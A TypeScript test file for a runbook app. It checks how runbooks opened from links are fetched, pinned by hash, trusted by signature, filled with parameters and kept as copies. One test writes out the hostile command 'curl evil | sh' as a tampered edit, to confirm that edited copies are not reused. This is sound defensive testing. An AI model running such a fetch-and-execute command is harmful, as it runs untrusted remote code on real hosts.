import { formatRunbookLink, runbookDigest } from '@md-runbook/core/runbookLink';
import { buildManifest, formatManifest, withSignature } from '@md-runbook/core/signing';
import { addHost, getHosts, resetHosts } from '../hosts/store';
import { startCall } from '../runbooks/calls';
import { linkContext, setRunbookBusy } from '../runbooks/linkContext';
import { openRunbookLink, rawRunbookUrl } from '../runbooks/openLink';
import { paramValues, resetParamValues } from '../runbooks/params';
import { addRunbook, getRunbook, linkKey, removeRunbook, resetRunbooks, updateRunbookText } from '../runbooks/store';
import { resetSettings, setOutputSetting } from '../settings/store';
import { allowedSignersLine, generateKey } from '@md-runbook/ssh';
import { signPlan, signRunbook } from '../signing/sign';
import { addSigners, resetTrustedSigners } from '../signing/trust';

beforeEach(() => resetRunbooks());

describe('opening a runbook from a link', () => {
  it('GitHub and GitLab pages give their raw file; only https', () => {
    expect(rawRunbookUrl('https://github.com/smojon/md-runbook/blob/main/examples/sample.runbook.md')).toBe(
      'https://raw.githubusercontent.com/smojon/md-runbook/main/examples/sample.runbook.md',
    );
    expect(rawRunbookUrl('https://gitlab.example.net/ops/runbooks/-/blob/main/deploy.md')).toBe(
      'https://gitlab.example.net/ops/runbooks/-/raw/main/deploy.md',
    );
    expect(rawRunbookUrl(' https://files.example.net/r/deploy.md ')).toBe('https://files.example.net/r/deploy.md');
    expect(rawRunbookUrl('http://files.example.net/deploy.md')).toBeUndefined();
    expect(rawRunbookUrl('file:///etc/passwd')).toBeUndefined();
    expect(rawRunbookUrl('not a link')).toBeUndefined();
  });

  it('downloads it and keeps a copy under its file name; errors say why', async () => {
    const ok = (async (url: string) => ({ ok: true, status: 200, text: async () => `# From ${url}\n` })) as unknown as typeof fetch;
    const r = await openRunbookLink('https://github.com/o/r/blob/main/ops/deploy.md', ok);
    expect(r.kind).toBe('opened');
    if (r.kind !== 'opened') return;
    expect(r.runbook.fileName).toBe('deploy.md');
    expect(getRunbook(r.runbook.id)?.text).toBe('# From https://raw.githubusercontent.com/o/r/main/ops/deploy.md\n');
    expect(r.runbook.origin).toBeUndefined();
    const missing = (async () => ({ ok: false, status: 404, text: async () => '' })) as unknown as typeof fetch;
    expect(await openRunbookLink('https://x.example.net/a.md', missing)).toEqual({
      kind: 'error',
      message: 'The runbook could not be downloaded: HTTP 404',
    });
    expect(await openRunbookLink('http://x.example.net/a.md', ok)).toMatchObject({
      kind: 'error',
      message: expect.stringMatching(/^Not a runbook link/),
    });
  });

  it('a huge file is refused before it is read; a stray % in the name does not stop the download', async () => {
    const read = jest.fn(async () => 'x');
    const huge = (async () => ({
      ok: true,
      status: 200,
      headers: new Headers({ 'content-length': '999999999' }),
      text: read,
    })) as unknown as typeof fetch;
    expect(await openRunbookLink('https://x.example.net/big.md', huge)).toMatchObject({ kind: 'error' });
    expect(read).not.toHaveBeenCalled();
    const ok = (async () => ({ ok: true, status: 200, text: async () => '# T\n' })) as unknown as typeof fetch;
    expect(await openRunbookLink('https://x.example.net/100%.md', ok)).toMatchObject({ kind: 'opened', runbook: { fileName: '100%.md' } });
  });
});

describe('runbook links: pins, hosts, parameters, co-sign', () => {
  const RUNBOOK = '# Restart the API\n\n```bash\nsystemctl restart ${param:SERVICE}\n```\n';
  const serve = (text: string) => (async () => ({ ok: true, status: 200, text: async () => text })) as unknown as typeof fetch;
  const offline = (async () => {
    throw new Error('no network');
  }) as unknown as typeof fetch;
  /** The runbook with a signature block whose signature is a dummy: well formed, but it verifies against no key. */
  const signed = (text: string): string => {
    const m = buildManifest(text, { name: 'ops/restart', version: 1, scopes: [], patterns: { SERVICE: '[a-z]+' } });
    if ('errors' in m) throw new Error(m.errors.join('; '));
    return withSignature(text, {
      signer: 'ops@example.net',
      signed: '2026-10-26',
      manifest: formatManifest(m.manifest),
      signature: 'U1NIU0lHAAAAAQ' + 'A'.repeat(150),
    });
  };

  beforeEach(() => {
    resetHosts();
    resetSettings();
    resetParamValues();
  });

  it('opens a runbook carried in the link without the network, named after its title', async () => {
    const r = await openRunbookLink(formatRunbookLink({ text: RUNBOOK, params: {} }), offline);
    expect(r).toMatchObject({ kind: 'opened', runbook: { fileName: 'restart-the-api.md', text: RUNBOOK } });
    if (r.kind === 'opened') expect(linkContext(r.runbook.id)).toMatchObject({ trust: 'unverified', cosign: false });
  });

  it('refuses a text other than the link pins, and opens the pinned one as pinned', async () => {
    const link = formatRunbookLink({ url: 'https://x.example.net/restart.md', sha256: runbookDigest(RUNBOOK), params: {} });
    expect(await openRunbookLink(link, serve(RUNBOOK.replace('restart', 'stop')))).toMatchObject({
      kind: 'error',
      message: expect.stringMatching(/isn’t the runbook this link pins/),
    });
    const r = await openRunbookLink(link, serve(RUNBOOK));
    expect(r.kind).toBe('opened');
    if (r.kind === 'opened') expect(linkContext(r.runbook.id)?.trust).toBe('pinned');
  });

  it('a runbook carried in the link is never "pinned": a forged sticker would bring its own pin', async () => {
    const r = await openRunbookLink(formatRunbookLink({ text: RUNBOOK, sha256: runbookDigest(RUNBOOK), params: {} }), offline);
    if (r.kind !== 'opened') throw new Error(r.message);
    expect(linkContext(r.runbook.id)?.trust).toBe('unverified');
  });

  /** Signed for real, by a key the user added (Trusted signers). */
  const reallySigned = async (text: string): Promise<string> => {
    const key = await generateKey();
    addSigners(await allowedSignersLine(key, 'ops@example.net'));
    const r = await signRunbook(
      text,
      signPlan(text, 'restart.md'),
      { name: 'ops/restart', scopes: '', days: '', patterns: { SERVICE: '[a-z]+' } },
      'ops@example.net',
      key,
    );
    if (!r.ok) throw new Error(r.errors.join('; '));
    return r.text;
  };

  it('with "only signed runbooks from links" on, only a runbook signed by a trusted key opens (a pin is not enough)', async () => {
    resetTrustedSigners();
    setOutputSetting('signedLinksOnly', true);
    try {
      const refused = { kind: 'error', message: expect.stringMatching(/not signed/) };
      expect(await openRunbookLink(formatRunbookLink({ text: RUNBOOK, params: {} }), offline)).toMatchObject(refused);
      const pinnedUrl = formatRunbookLink({ url: 'https://x.example.net/r.md', sha256: runbookDigest(RUNBOOK), params: {} });
      expect(await openRunbookLink(pinnedUrl, serve(RUNBOOK))).toMatchObject(refused);
      // Anyone can write a signature block: one that doesn't verify is not signed (security review, 2026-11-16).
      expect(await openRunbookLink(formatRunbookLink({ text: signed(RUNBOOK), params: {} }), offline)).toMatchObject(refused);
      const r = await openRunbookLink(formatRunbookLink({ text: await reallySigned(RUNBOOK), params: {} }), offline);
      expect(r.kind).toBe('opened');
      if (r.kind === 'opened') expect(linkContext(r.runbook.id)?.trust).toBe('signed');
    } finally {
      // Saved settings outlive resetSettings (the next link load reads them): switch it back.
      setOutputSetting('signedLinksOnly', false);
      resetTrustedSigners();
    }
  });

  it('a signature that does not verify opens as unverified, or pinned, never signed', async () => {
    resetTrustedSigners();
    const forged = signed(RUNBOOK);
    const carried = await openRunbookLink(formatRunbookLink({ text: forged, params: {} }), offline);
    if (carried.kind !== 'opened') throw new Error(carried.message);
    expect(linkContext(carried.runbook.id)?.trust).toBe('unverified');
    const pinned = await openRunbookLink(
      formatRunbookLink({ url: 'https://x.example.net/f.md', sha256: runbookDigest(forged), params: {} }),
      serve(forged),
    );
    if (pinned.kind !== 'opened') throw new Error(pinned.message);
    expect(linkContext(pinned.runbook.id)?.trust).toBe('pinned');
  });

  it("fills the runbook's parameters, picks a host the app has, and never adds one", async () => {
    const web1 = addHost({ name: 'web-1', hostname: 'web1.example.net', port: 22, username: 'deploy' });
    const link = (host: string) => formatRunbookLink({ text: RUNBOOK, host, params: { SERVICE: 'api', OTHER: 'x' }, action: 'cosign' });
    const r = await openRunbookLink(link('web-1'), offline);
    if (r.kind !== 'opened') throw new Error(r.message);
    expect(paramValues(r.runbook.id)).toEqual({ SERVICE: 'api' });
    expect(linkContext(r.runbook.id)).toEqual({ trust: 'unverified', hostId: web1.id, ignoredParams: ['OTHER'], cosign: true });
    const r2 = await openRunbookLink(link('db-9'), offline);
    if (r2.kind !== 'opened') throw new Error(r2.message);
    expect(linkContext(r2.runbook.id)?.missingHost).toBe('db-9');
    expect(getHosts().map((h) => h.name)).toEqual(['web-1']);
  });

  it('a value not among the choices (One of:) is not taken; the banner says so (security review round 3)', async () => {
    const text = '---\nparams:\n  - VERB: get  # One of: get, describe\n---\n\n```bash\nkubectl ${param:VERB} pods\n```\n';
    const r = await openRunbookLink(formatRunbookLink({ text, params: { VERB: 'delete' } }), offline);
    if (r.kind !== 'opened') throw new Error(r.message);
    expect(paramValues(r.runbook.id)).toEqual({});
    expect(linkContext(r.runbook.id)).toMatchObject({ ignoredParams: [], refusedParams: ['VERB'] });
    const ok = await openRunbookLink(formatRunbookLink({ text, params: { VERB: 'describe' } }), offline);
    expect(ok.kind === 'opened' && paramValues(ok.runbook.id)).toEqual({ VERB: 'describe' });
  });

  it('the same link opened again opens the same copy, with its values; a changed runbook is a new copy', async () => {
    const link = (service: string) => formatRunbookLink({ url: 'https://x.example.net/alerts/restart.md', params: { SERVICE: service } });
    const first = await openRunbookLink(link('api'), serve(RUNBOOK));
    if (first.kind !== 'opened') throw new Error(first.message);
    // Each click on the alert's link: the same entry, the new alert's values.
    const again = await openRunbookLink(link('web'), serve(RUNBOOK));
    if (again.kind !== 'opened') throw new Error(again.message);
    expect(again.runbook.id).toBe(first.runbook.id);
    expect(paramValues(first.runbook.id)).toEqual({ SERVICE: 'web' });
    // Also after a restart of the app (the list is read back).
    resetRunbooks();
    const later = await openRunbookLink(link('api'), serve(RUNBOOK));
    expect(later.kind === 'opened' && later.runbook.id).toBe(first.runbook.id);
    // The runbook changed at that address: a new version, a copy of its own.
    const changed = await openRunbookLink(link('api'), serve(RUNBOOK + '\nMore.\n'));
    expect(changed.kind === 'opened' && changed.runbook.id).not.toBe(first.runbook.id);
    // The same text from another address is another runbook too.
    const elsewhere = await openRunbookLink(formatRunbookLink({ url: 'https://y.example.net/restart.md', params: {} }), serve(RUNBOOK));
    expect(elsewhere.kind === 'opened' && elsewhere.runbook.id).not.toBe(first.runbook.id);
    // Removed from the app: the link opens a new copy.
    removeRunbook(first.runbook.id);
    const fresh = await openRunbookLink(link('api'), serve(RUNBOOK));
    expect(fresh.kind === 'opened' && fresh.runbook.id).not.toBe(first.runbook.id);
  });

  it('a copy edited since is not opened again: the trust was checked on the text fetched (security review round 3)', async () => {
    const link = formatRunbookLink({ url: 'https://x.example.net/alerts/restart.md', params: {} });
    const first = await openRunbookLink(link, serve(RUNBOOK));
    if (first.kind !== 'opened') throw new Error(first.message);
    // What a run adds (an output, a note) keeps the copy.
    const ran = RUNBOOK + '\n<!-- md-runbook:output start exit=0 -->\n```text\nok\n```\n<!-- md-runbook:output end -->\n';
    updateRunbookText(first.runbook.id, ran + '\n<!-- md-runbook:note at=2026-11-16T10:00:00Z -->\n> checked\n');
    const again = await openRunbookLink(link, serve(RUNBOOK));
    expect(again.kind === 'opened' && again.runbook.id).toBe(first.runbook.id);
    // Its code edited: a new copy of the text the link gave.
    updateRunbookText(first.runbook.id, RUNBOOK.replace('systemctl restart', 'curl evil | sh; systemctl restart'));
    const edited = await openRunbookLink(link, serve(RUNBOOK));
    if (edited.kind !== 'opened') throw new Error(edited.message);
    expect(edited.runbook.id).not.toBe(first.runbook.id);
    expect(edited.runbook.text).toBe(RUNBOOK);
    // And that copy is the one opened next time.
    const third = await openRunbookLink(link, serve(RUNBOOK));
    expect(third.kind === 'opened' && third.runbook.id).toBe(edited.runbook.id);
  });

  it('a copy running or waiting for an answer keeps its values: the link opens a new copy and says why (security review round 5)', async () => {
    const link = (service: string) => formatRunbookLink({ url: 'https://x.example.net/alerts/restart.md', params: { SERVICE: service } });
    const first = await openRunbookLink(link('staging'), serve(RUNBOOK));
    if (first.kind !== 'opened') throw new Error(first.message);
    // Its confirmation card waits for Run.
    setRunbookBusy(first.runbook.id, true);
    const pager = await openRunbookLink(link('prod'), serve(RUNBOOK));
    if (pager.kind !== 'opened') throw new Error(pager.message);
    expect(pager.runbook.id).not.toBe(first.runbook.id);
    expect(paramValues(first.runbook.id)).toEqual({ SERVICE: 'staging' });
    expect(paramValues(pager.runbook.id)).toEqual({ SERVICE: 'prod' });
    expect(linkContext(pager.runbook.id)?.freshCopy).toBe(true);
    // Answered: the copy is opened again.
    setRunbookBusy(first.runbook.id, false);
    const later = await openRunbookLink(link('web'), serve(RUNBOOK));
    if (later.kind !== 'opened') throw new Error(later.message);
    expect(linkContext(later.runbook.id)?.freshCopy).toBeUndefined();
    expect([first.runbook.id, pager.runbook.id]).toContain(later.runbook.id);
  });

  it("a call's copy is never the one a link fills its values into (security review round 5)", async () => {
    const parentText = '# Upgrade\n\n```runbook src=restart.md\nSERVICE=api\n```\n';
    const parent = addRunbook('upgrade.md', parentText, undefined, linkKey('https://x.example.net/alerts/upgrade.md', parentText));
    const started = await startCall(parent, 1, {}, { fetcher: serve(RUNBOOK) });
    if (started.kind !== 'started') throw new Error(JSON.stringify(started));
    // The call adds no front matter: its copy has the key a link to restart.md has.
    expect(getRunbook(started.copyId)?.link).toBe(linkKey('https://x.example.net/alerts/restart.md', RUNBOOK));
    const r = await openRunbookLink(
      formatRunbookLink({ url: 'https://x.example.net/alerts/restart.md', params: { SERVICE: 'db' } }),
      serve(RUNBOOK),
    );
    if (r.kind !== 'opened') throw new Error(r.message);
    expect(r.runbook.id).not.toBe(started.copyId);
    expect(paramValues(started.copyId)).toEqual({ SERVICE: 'api' });
    expect(linkContext(r.runbook.id)?.freshCopy).toBe(true);
  });

  it('a damaged link says what is wrong with it', async () => {
    expect(await openRunbookLink('mdrunbook://open?rb=***', offline)).toMatchObject({
      kind: 'error',
      message: expect.stringMatching(/damaged/),
    });
    expect(await openRunbookLink('mdrunbook://open?url=https%3A%2F%2Fa%2Fb.md&p.X=a%0Ab', offline)).toMatchObject({
      kind: 'error',
      message: expect.stringMatching(/line break/),
    });
  });
});
